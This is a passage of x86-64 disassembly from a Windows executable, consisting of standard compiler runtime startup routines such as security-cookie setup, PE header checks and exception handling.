   1400025d8:	48 83 c4 20          	add    $0x20,%rsp
   1400025dc:	5f                   	pop    %rdi
   1400025dd:	c3                   	ret
   1400025de:	cc                   	int3
   1400025df:	cc                   	int3
   1400025e0:	48 83 ec 48          	sub    $0x48,%rsp
   1400025e4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400025e9:	e8 e2 fe ff ff       	call   0x1400024d0
   1400025ee:	48 8d 15 bb 2a 00 00 	lea    0x2abb(%rip),%rdx        # 0x1400050b0
   1400025f5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400025fa:	e8 a1 09 00 00       	call   0x140002fa0
   1400025ff:	cc                   	int3
   140002600:	48 83 ec 48          	sub    $0x48,%rsp
   140002604:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002609:	e8 22 ff ff ff       	call   0x140002530
   14000260e:	48 8d 15 23 2b 00 00 	lea    0x2b23(%rip),%rdx        # 0x140005138
   140002615:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000261a:	e8 81 09 00 00       	call   0x140002fa0
   14000261f:	cc                   	int3
   140002620:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140002625:	48 8d 05 94 1d 00 00 	lea    0x1d94(%rip),%rax        # 0x1400043c0
   14000262c:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140002631:	c3                   	ret
   140002632:	cc                   	int3
   140002633:	cc                   	int3
   140002634:	48 83 ec 28          	sub    $0x28,%rsp
   140002638:	e8 4b 09 00 00       	call   0x140002f88
   14000263d:	85 c0                	test   %eax,%eax
   14000263f:	74 21                	je     0x140002662
   140002641:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140002648:	00 00 
   14000264a:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000264e:	eb 05                	jmp    0x140002655
   140002650:	48 3b c8             	cmp    %rax,%rcx
   140002653:	74 14                	je     0x140002669
   140002655:	33 c0                	xor    %eax,%eax
   140002657:	f0 48 0f b1 0d a8 40 	lock cmpxchg %rcx,0x40a8(%rip)        # 0x140006708
   14000265e:	00 00 
   140002660:	75 ee                	jne    0x140002650
   140002662:	32 c0                	xor    %al,%al
   140002664:	48 83 c4 28          	add    $0x28,%rsp
   140002668:	c3                   	ret
   140002669:	b0 01                	mov    $0x1,%al
   14000266b:	eb f7                	jmp    0x140002664
   14000266d:	cc                   	int3
   14000266e:	cc                   	int3
   14000266f:	cc                   	int3
   140002670:	48 83 ec 28          	sub    $0x28,%rsp
   140002674:	85 c9                	test   %ecx,%ecx
   140002676:	75 07                	jne    0x14000267f
   140002678:	c6 05 91 40 00 00 01 	movb   $0x1,0x4091(%rip)        # 0x140006710
   14000267f:	e8 6c 06 00 00       	call   0x140002cf0
   140002684:	e8 bf 02 00 00       	call   0x140002948
   140002689:	84 c0                	test   %al,%al
   14000268b:	75 04                	jne    0x140002691
   14000268d:	32 c0                	xor    %al,%al
   14000268f:	eb 14                	jmp    0x1400026a5
   140002691:	e8 b2 02 00 00       	call   0x140002948
   140002696:	84 c0                	test   %al,%al
   140002698:	75 09                	jne    0x1400026a3
   14000269a:	33 c9                	xor    %ecx,%ecx
   14000269c:	e8 a7 02 00 00       	call   0x140002948
   1400026a1:	eb ea                	jmp    0x14000268d
   1400026a3:	b0 01                	mov    $0x1,%al
   1400026a5:	48 83 c4 28          	add    $0x28,%rsp
   1400026a9:	c3                   	ret
   1400026aa:	cc                   	int3
   1400026ab:	cc                   	int3
   1400026ac:	40 53                	rex push %rbx
   1400026ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400026b2:	80 3d 58 40 00 00 00 	cmpb   $0x0,0x4058(%rip)        # 0x140006711
   1400026b9:	8b d9                	mov    %ecx,%ebx
   1400026bb:	75 67                	jne    0x140002724
   1400026bd:	83 f9 01             	cmp    $0x1,%ecx
   1400026c0:	77 6a                	ja     0x14000272c
   1400026c2:	e8 c1 08 00 00       	call   0x140002f88
   1400026c7:	85 c0                	test   %eax,%eax
   1400026c9:	74 28                	je     0x1400026f3
   1400026cb:	85 db                	test   %ebx,%ebx
   1400026cd:	75 24                	jne    0x1400026f3
   1400026cf:	48 8d 0d 42 40 00 00 	lea    0x4042(%rip),%rcx        # 0x140006718
   1400026d6:	e8 67 09 00 00       	call   0x140003042
   1400026db:	85 c0                	test   %eax,%eax
   1400026dd:	75 10                	jne    0x1400026ef
   1400026df:	48 8d 0d 4a 40 00 00 	lea    0x404a(%rip),%rcx        # 0x140006730
   1400026e6:	e8 57 09 00 00       	call   0x140003042
   1400026eb:	85 c0                	test   %eax,%eax
   1400026ed:	74 2e                	je     0x14000271d
   1400026ef:	32 c0                	xor    %al,%al
   1400026f1:	eb 33                	jmp    0x140002726
   1400026f3:	66 0f 6f 05 35 1d 00 	movdqa 0x1d35(%rip),%xmm0        # 0x140004430
   1400026fa:	00 
   1400026fb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400026ff:	f3 0f 7f 05 11 40 00 	movdqu %xmm0,0x4011(%rip)        # 0x140006718
   140002706:	00 
   140002707:	48 89 05 1a 40 00 00 	mov    %rax,0x401a(%rip)        # 0x140006728
   14000270e:	f3 0f 7f 05 1a 40 00 	movdqu %xmm0,0x401a(%rip)        # 0x140006730
   140002715:	00 
   140002716:	48 89 05 23 40 00 00 	mov    %rax,0x4023(%rip)        # 0x140006740
   14000271d:	c6 05 ed 3f 00 00 01 	movb   $0x1,0x3fed(%rip)        # 0x140006711
   140002724:	b0 01                	mov    $0x1,%al
   140002726:	48 83 c4 20          	add    $0x20,%rsp
   14000272a:	5b                   	pop    %rbx
   14000272b:	c3                   	ret
   14000272c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140002731:	e8 6a 02 00 00       	call   0x1400029a0
   140002736:	cc                   	int3
   140002737:	cc                   	int3
   140002738:	48 83 ec 18          	sub    $0x18,%rsp
   14000273c:	4c 8b c1             	mov    %rcx,%r8
   14000273f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140002744:	66 39 05 b5 d8 ff ff 	cmp    %ax,-0x274b(%rip)        # 0x140000000
   14000274b:	75 78                	jne    0x1400027c5
   14000274d:	48 63 0d e8 d8 ff ff 	movslq -0x2718(%rip),%rcx        # 0x14000003c
   140002754:	48 8d 15 a5 d8 ff ff 	lea    -0x275b(%rip),%rdx        # 0x140000000
   14000275b:	48 03 ca             	add    %rdx,%rcx
   14000275e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002764:	75 5f                	jne    0x1400027c5
   140002766:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000276b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   14000276f:	75 54                	jne    0x1400027c5
   140002771:	4c 2b c2             	sub    %rdx,%r8
   140002774:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140002778:	48 83 c2 18          	add    $0x18,%rdx
   14000277c:	48 03 d1             	add    %rcx,%rdx
   14000277f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140002783:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002787:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   14000278b:	48 89 14 24          	mov    %rdx,(%rsp)
   14000278f:	49 3b d1             	cmp    %r9,%rdx
   140002792:	74 18                	je     0x1400027ac
   140002794:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140002797:	4c 3b c1             	cmp    %rcx,%r8
   14000279a:	72 0a                	jb     0x1400027a6
   14000279c:	8b 42 08             	mov    0x8(%rdx),%eax
   14000279f:	03 c1                	add    %ecx,%eax
   1400027a1:	4c 3b c0             	cmp    %rax,%r8
   1400027a4:	72 08                	jb     0x1400027ae
   1400027a6:	48 83 c2 28          	add    $0x28,%rdx
   1400027aa:	eb df                	jmp    0x14000278b
   1400027ac:	33 d2                	xor    %edx,%edx
   1400027ae:	48 85 d2             	test   %rdx,%rdx
   1400027b1:	75 04                	jne    0x1400027b7
   1400027b3:	32 c0                	xor    %al,%al
   1400027b5:	eb 14                	jmp    0x1400027cb
   1400027b7:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   1400027bb:	7d 04                	jge    0x1400027c1
   1400027bd:	32 c0                	xor    %al,%al
   1400027bf:	eb 0a                	jmp    0x1400027cb
   1400027c1:	b0 01                	mov    $0x1,%al
   1400027c3:	eb 06                	jmp    0x1400027cb
   1400027c5:	32 c0                	xor    %al,%al
   1400027c7:	eb 02                	jmp    0x1400027cb
   1400027c9:	32 c0                	xor    %al,%al
   1400027cb:	48 83 c4 18          	add    $0x18,%rsp
   1400027cf:	c3                   	ret
   1400027d0:	40 53                	rex push %rbx
   1400027d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400027d6:	8a d9                	mov    %cl,%bl
   1400027d8:	e8 ab 07 00 00       	call   0x140002f88
   1400027dd:	33 d2                	xor    %edx,%edx
   1400027df:	85 c0                	test   %eax,%eax
   1400027e1:	74 0b                	je     0x1400027ee
   1400027e3:	84 db                	test   %bl,%bl
   1400027e5:	75 07                	jne    0x1400027ee
   1400027e7:	48 87 15 1a 3f 00 00 	xchg   %rdx,0x3f1a(%rip)        # 0x140006708
   1400027ee:	48 83 c4 20          	add    $0x20,%rsp
   1400027f2:	5b                   	pop    %rbx
   1400027f3:	c3                   	ret
   1400027f4:	40 53                	rex push %rbx
   1400027f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400027fa:	80 3d 0f 3f 00 00 00 	cmpb   $0x0,0x3f0f(%rip)        # 0x140006710
   140002801:	8a d9                	mov    %cl,%bl
   140002803:	74 04                	je     0x140002809
   140002805:	84 d2                	test   %dl,%dl
   140002807:	75 0c                	jne    0x140002815
   140002809:	e8 3a 01 00 00       	call   0x140002948
   14000280e:	8a cb                	mov    %bl,%cl
   140002810:	e8 33 01 00 00       	call   0x140002948
   140002815:	b0 01                	mov    $0x1,%al
   140002817:	48 83 c4 20          	add    $0x20,%rsp
   14000281b:	5b                   	pop    %rbx
   14000281c:	c3                   	ret
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	40 53                	rex push %rbx
   140002822:	48 83 ec 20          	sub    $0x20,%rsp
   140002826:	48 83 3d ea 3e 00 00 	cmpq   $0xffffffffffffffff,0x3eea(%rip)        # 0x140006718
   14000282d:	ff 
   14000282e:	48 8b d9             	mov    %rcx,%rbx
   140002831:	75 07                	jne    0x14000283a
   140002833:	e8 16 08 00 00       	call   0x14000304e
   140002838:	eb 0f                	jmp    0x140002849
   14000283a:	48 8b d3             	mov    %rbx,%rdx
   14000283d:	48 8d 0d d4 3e 00 00 	lea    0x3ed4(%rip),%rcx        # 0x140006718
   140002844:	e8 ff 07 00 00       	call   0x140003048
   140002849:	33 d2                	xor    %edx,%edx
   14000284b:	85 c0                	test   %eax,%eax
   14000284d:	48 0f 44 d3          	cmove  %rbx,%rdx
   140002851:	48 8b c2             	mov    %rdx,%rax
   140002854:	48 83 c4 20          	add    $0x20,%rsp
   140002858:	5b                   	pop    %rbx
   140002859:	c3                   	ret
   14000285a:	cc                   	int3
   14000285b:	cc                   	int3
   14000285c:	48 83 ec 28          	sub    $0x28,%rsp
   140002860:	e8 bb ff ff ff       	call   0x140002820
   140002865:	48 f7 d8             	neg    %rax
   140002868:	1b c0                	sbb    %eax,%eax
   14000286a:	f7 d8                	neg    %eax
   14000286c:	ff c8                	dec    %eax
   14000286e:	48 83 c4 28          	add    $0x28,%rsp
   140002872:	c3                   	ret
   140002873:	cc                   	int3
   140002874:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002879:	55                   	push   %rbp
   14000287a:	48 8b ec             	mov    %rsp,%rbp
   14000287d:	48 83 ec 30          	sub    $0x30,%rsp
   140002881:	48 8b 05 b8 37 00 00 	mov    0x37b8(%rip),%rax        # 0x140006040
   140002888:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   14000288f:	2b 00 00 
   140002892:	48 3b c3             	cmp    %rbx,%rax
   140002895:	75 77                	jne    0x14000290e
   140002897:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000289b:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   1400028a2:	00 
   1400028a3:	ff 15 07 18 00 00    	call   *0x1807(%rip)        # 0x1400040b0
   1400028a9:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400028ad:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400028b1:	ff 15 e1 17 00 00    	call   *0x17e1(%rip)        # 0x140004098
   1400028b7:	8b c0                	mov    %eax,%eax
   1400028b9:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400028bd:	ff 15 cd 17 00 00    	call   *0x17cd(%rip)        # 0x140004090
   1400028c3:	8b c0                	mov    %eax,%eax
   1400028c5:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400028c9:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400028cd:	ff 15 b5 17 00 00    	call   *0x17b5(%rip)        # 0x140004088
   1400028d3:	8b 45 18             	mov    0x18(%rbp),%eax
   1400028d6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400028da:	48 c1 e0 20          	shl    $0x20,%rax
   1400028de:	48 33 45 18          	xor    0x18(%rbp),%rax
   1400028e2:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   1400028e6:	48 33 c1             	xor    %rcx,%rax
   1400028e9:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1400028f0:	ff 00 00 
   1400028f3:	48 23 c1             	and    %rcx,%rax
   1400028f6:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1400028fd:	2b 00 00 
   140002900:	48 3b c3             	cmp    %rbx,%rax
   140002903:	48 0f 44 c1          	cmove  %rcx,%rax
   140002907:	48 89 05 32 37 00 00 	mov    %rax,0x3732(%rip)        # 0x140006040
   14000290e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002913:	48 f7 d0             	not    %rax
   140002916:	48 89 05 63 37 00 00 	mov    %rax,0x3763(%rip)        # 0x140006080
   14000291d:	48 83 c4 30          	add    $0x30,%rsp
   140002921:	5d                   	pop    %rbp
   140002922:	c3                   	ret
   140002923:	cc                   	int3
   140002924:	33 c0                	xor    %eax,%eax
   140002926:	c3                   	ret
   140002927:	cc                   	int3
   140002928:	b8 01 00 00 00       	mov    $0x1,%eax
   14000292d:	c3                   	ret
   14000292e:	cc                   	int3
   14000292f:	cc                   	int3
   140002930:	b8 00 40 00 00       	mov    $0x4000,%eax
   140002935:	c3                   	ret
   140002936:	cc                   	int3
   140002937:	cc                   	int3
   140002938:	48 8d 0d 11 3e 00 00 	lea    0x3e11(%rip),%rcx        # 0x140006750
   14000293f:	48 ff 25 72 17 00 00 	rex.W jmp *0x1772(%rip)        # 0x1400040b8
   140002946:	cc                   	int3
   140002947:	cc                   	int3
   140002948:	b0 01                	mov    $0x1,%al
   14000294a:	c3                   	ret
   14000294b:	cc                   	int3
   14000294c:	48 8d 05 0d 3e 00 00 	lea    0x3e0d(%rip),%rax        # 0x140006760
   140002953:	c3                   	ret
   140002954:	48 8d 05 0d 3e 00 00 	lea    0x3e0d(%rip),%rax        # 0x140006768
   14000295b:	c3                   	ret
   14000295c:	48 83 ec 28          	sub    $0x28,%rsp
   140002960:	e8 e7 ff ff ff       	call   0x14000294c
   140002965:	48 83 08 24          	orq    $0x24,(%rax)
   140002969:	e8 e6 ff ff ff       	call   0x140002954
   14000296e:	48 83 08 02          	orq    $0x2,(%rax)
   140002972:	48 83 c4 28          	add    $0x28,%rsp
   140002976:	c3                   	ret
   140002977:	cc                   	int3
   140002978:	33 c0                	xor    %eax,%eax
   14000297a:	39 05 10 37 00 00    	cmp    %eax,0x3710(%rip)        # 0x140006090
   140002980:	0f 94 c0             	sete   %al
   140002983:	c3                   	ret
   140002984:	48 8d 05 fd 3d 00 00 	lea    0x3dfd(%rip),%rax        # 0x140006788
   14000298b:	c3                   	ret
   14000298c:	48 8d 05 ed 3d 00 00 	lea    0x3ded(%rip),%rax        # 0x140006780
   140002993:	c3                   	ret
   140002994:	c7 05 d2 3d 00 00 00 	movl   $0x0,0x3dd2(%rip)        # 0x140006770
   14000299b:	00 00 00 
   14000299e:	c3                   	ret
   14000299f:	cc                   	int3
   1400029a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400029a5:	55                   	push   %rbp
   1400029a6:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400029ad:	ff 
   1400029ae:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400029b5:	8b d9                	mov    %ecx,%ebx
   1400029b7:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400029bc:	ff 15 be 16 00 00    	call   *0x16be(%rip)        # 0x140004080
   1400029c2:	85 c0                	test   %eax,%eax
   1400029c4:	74 04                	je     0x1400029ca
   1400029c6:	8b cb                	mov    %ebx,%ecx
   1400029c8:	cd 29                	int    $0x29
   1400029ca:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400029cf:	e8 c0 ff ff ff       	call   0x140002994
   1400029d4:	33 d2                	xor    %edx,%edx
   1400029d6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400029da:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400029e0:	e8 c1 05 00 00       	call   0x140002fa6
   1400029e5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400029e9:	ff 15 51 16 00 00    	call   *0x1651(%rip)        # 0x140004040
   1400029ef:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1400029f6:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1400029fd:	48 8b cb             	mov    %rbx,%rcx
   140002a00:	45 33 c0             	xor    %r8d,%r8d
   140002a03:	ff 15 3f 16 00 00    	call   *0x163f(%rip)        # 0x140004048
   140002a09:	48 85 c0             	test   %rax,%rax
   140002a0c:	74 3f                	je     0x140002a4d
   140002a0e:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140002a15:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140002a1c:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140002a23:	00 00 
   140002a25:	4c 8b c8             	mov    %rax,%r9
   140002a28:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002a2d:	4c 8b c3             	mov    %rbx,%r8
   140002a30:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140002a37:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002a3c:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002a40:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002a45:	33 c9                	xor    %ecx,%ecx
   140002a47:	ff 15 03 16 00 00    	call   *0x1603(%rip)        # 0x140004050
   140002a4d:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140002a54:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002a59:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140002a60:	33 d2                	xor    %edx,%edx
   140002a62:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140002a69:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140002a6f:	48 83 c0 08          	add    $0x8,%rax
   140002a73:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140002a7a:	e8 27 05 00 00       	call   0x140002fa6
   140002a7f:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140002a86:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002a8b:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140002a92:	40 
   140002a93:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140002a9a:	00 
   140002a9b:	ff 15 07 16 00 00    	call   *0x1607(%rip)        # 0x1400040a8
   140002aa1:	8b d8                	mov    %eax,%ebx
   140002aa3:	33 c9                	xor    %ecx,%ecx
   140002aa5:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002aaa:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002aaf:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140002ab3:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002ab8:	ff 15 a2 15 00 00    	call   *0x15a2(%rip)        # 0x140004060
   140002abe:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002ac3:	ff 15 8f 15 00 00    	call   *0x158f(%rip)        # 0x140004058
   140002ac9:	85 c0                	test   %eax,%eax
   140002acb:	75 0d                	jne    0x140002ada
   140002acd:	83 fb 01             	cmp    $0x1,%ebx
   140002ad0:	74 08                	je     0x140002ada
   140002ad2:	8d 48 03             	lea    0x3(%rax),%ecx
   140002ad5:	e8 ba fe ff ff       	call   0x140002994
   140002ada:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140002ae1:	00 
   140002ae2:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140002ae9:	5d                   	pop    %rbp
   140002aea:	c3                   	ret
   140002aeb:	cc                   	int3
   140002aec:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140002af3:	33 d2                	xor    %edx,%edx
   140002af5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002afa:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   140002afe:	e8 a3 04 00 00       	call   0x140002fa6
   140002b03:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002b08:	ff 15 92 15 00 00    	call   *0x1592(%rip)        # 0x1400040a0
   140002b0e:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   140002b13:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002b18:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   140002b1e:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140002b25:	c3                   	ret
   140002b26:	cc                   	int3
   140002b27:	cc                   	int3
   140002b28:	e9 f7 fd ff ff       	jmp    0x140002924
   140002b2d:	cc                   	int3
   140002b2e:	cc                   	int3
   140002b2f:	cc                   	int3
   140002b30:	48 83 ec 28          	sub    $0x28,%rsp
   140002b34:	33 c9                	xor    %ecx,%ecx
   140002b36:	ff 15 34 15 00 00    	call   *0x1534(%rip)        # 0x140004070
   140002b3c:	48 85 c0             	test   %rax,%rax
   140002b3f:	74 3a                	je     0x140002b7b
   140002b41:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140002b46:	66 39 08             	cmp    %cx,(%rax)
   140002b49:	75 30                	jne    0x140002b7b
   140002b4b:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140002b4f:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   140002b56:	75 23                	jne    0x140002b7b
   140002b58:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140002b5d:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   140002b62:	75 17                	jne    0x140002b7b
   140002b64:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140002b6b:	0e 
   140002b6c:	76 0d                	jbe    0x140002b7b
   140002b6e:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   140002b75:	00 
   140002b76:	0f 95 c0             	setne  %al
   140002b79:	eb 02                	jmp    0x140002b7d
   140002b7b:	32 c0                	xor    %al,%al
   140002b7d:	48 83 c4 28          	add    $0x28,%rsp
   140002b81:	c3                   	ret
   140002b82:	cc                   	int3
   140002b83:	cc                   	int3
   140002b84:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140002b94
   140002b8b:	48 ff 25 ce 14 00 00 	rex.W jmp *0x14ce(%rip)        # 0x140004060
   140002b92:	cc                   	int3
   140002b93:	cc                   	int3
   140002b94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b99:	57                   	push   %rdi
   140002b9a:	48 83 ec 20          	sub    $0x20,%rsp
   140002b9e:	48 8b 19             	mov    (%rcx),%rbx
   140002ba1:	48 8b f9             	mov    %rcx,%rdi
   140002ba4:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002baa:	75 24                	jne    0x140002bd0
   140002bac:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140002bb0:	75 1e                	jne    0x140002bd0
   140002bb2:	8b 53 20             	mov    0x20(%rbx),%edx
   140002bb5:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   140002bbb:	74 20                	je     0x140002bdd
   140002bbd:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   140002bc3:	83 f8 01             	cmp    $0x1,%eax
   140002bc6:	76 15                	jbe    0x140002bdd
   140002bc8:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140002bce:	74 0d                	je     0x140002bdd
   140002bd0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002bd5:	33 c0                	xor    %eax,%eax
   140002bd7:	48 83 c4 20          	add    $0x20,%rsp
   140002bdb:	5f                   	pop    %rdi
   140002bdc:	c3                   	ret
   140002bdd:	e8 dc 03 00 00       	call   0x140002fbe
   140002be2:	48 89 18             	mov    %rbx,(%rax)
   140002be5:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140002be9:	e8 d6 03 00 00       	call   0x140002fc4
   140002bee:	48 89 18             	mov    %rbx,(%rax)
   140002bf1:	e8 5e 04 00 00       	call   0x140003054
   140002bf6:	cc                   	int3
   140002bf7:	cc                   	int3
   140002bf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002bfd:	57                   	push   %rdi
   140002bfe:	48 83 ec 20          	sub    $0x20,%rsp
   140002c02:	48 8d 1d 9f 21 00 00 	lea    0x219f(%rip),%rbx        # 0x140004da8
   140002c09:	48 8d 3d 98 21 00 00 	lea    0x2198(%rip),%rdi        # 0x140004da8
   140002c10:	eb 12                	jmp    0x140002c24
   140002c12:	48 8b 03             	mov    (%rbx),%rax
   140002c15:	48 85 c0             	test   %rax,%rax
   140002c18:	74 06                	je     0x140002c20
   140002c1a:	ff 15 a8 16 00 00    	call   *0x16a8(%rip)        # 0x1400042c8
   140002c20:	48 83 c3 08          	add    $0x8,%rbx
   140002c24:	48 3b df             	cmp    %rdi,%rbx
   140002c27:	72 e9                	jb     0x140002c12
   140002c29:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c2e:	48 83 c4 20          	add    $0x20,%rsp
   140002c32:	5f                   	pop    %rdi
   140002c33:	c3                   	ret
   140002c34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c39:	57                   	push   %rdi
   140002c3a:	48 83 ec 20          	sub    $0x20,%rsp
   140002c3e:	48 8d 1d 73 21 00 00 	lea    0x2173(%rip),%rbx        # 0x140004db8
   140002c45:	48 8d 3d 6c 21 00 00 	lea    0x216c(%rip),%rdi        # 0x140004db8
   140002c4c:	eb 12                	jmp    0x140002c60
   140002c4e:	48 8b 03             	mov    (%rbx),%rax
   140002c51:	48 85 c0             	test   %rax,%rax
   140002c54:	74 06                	je     0x140002c5c
   140002c56:	ff 15 6c 16 00 00    	call   *0x166c(%rip)        # 0x1400042c8
   140002c5c:	48 83 c3 08          	add    $0x8,%rbx
   140002c60:	48 3b df             	cmp    %rdi,%rbx
   140002c63:	72 e9                	jb     0x140002c4e
   140002c65:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c6a:	48 83 c4 20          	add    $0x20,%rsp
   140002c6e:	5f                   	pop    %rdi
   140002c6f:	c3                   	ret
   140002c70:	48 83 ec 28          	sub    $0x28,%rsp
   140002c74:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140002c78:	48 8b ca             	mov    %rdx,%rcx
   140002c7b:	49 8b d1             	mov    %r9,%rdx
   140002c7e:	e8 0d 00 00 00       	call   0x140002c90
   140002c83:	b8 01 00 00 00       	mov    $0x1,%eax
   140002c88:	48 83 c4 28          	add    $0x28,%rsp
   140002c8c:	c3                   	ret
   140002c8d:	cc                   	int3
   140002c8e:	cc                   	int3
   140002c8f:	cc                   	int3
   140002c90:	40 53                	rex push %rbx
   140002c92:	45 8b 18             	mov    (%r8),%r11d
   140002c95:	48 8b da             	mov    %rdx,%rbx
   140002c98:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140002c9c:	4c 8b c9             	mov    %rcx,%r9
   140002c9f:	41 f6 00 04          	testb  $0x4,(%r8)
   140002ca3:	4c 8b d1             	mov    %rcx,%r10
   140002ca6:	74 13                	je     0x140002cbb
   140002ca8:	41 8b 40 08          	mov    0x8(%r8),%eax
   140002cac:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140002cb0:	f7 d8                	neg    %eax
   140002cb2:	4c 03 d1             	add    %rcx,%r10
   140002cb5:	48 63 c8             	movslq %eax,%rcx
   140002cb8:	4c 23 d1             	and    %rcx,%r10
   140002cbb:	49 63 c3             	movslq %r11d,%rax
   140002cbe:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140002cc2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140002cc6:	8b 48 08             	mov    0x8(%rax),%ecx
   140002cc9:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002ccd:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140002cd2:	74 10                	je     0x140002ce4
   140002cd4:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140002cd9:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
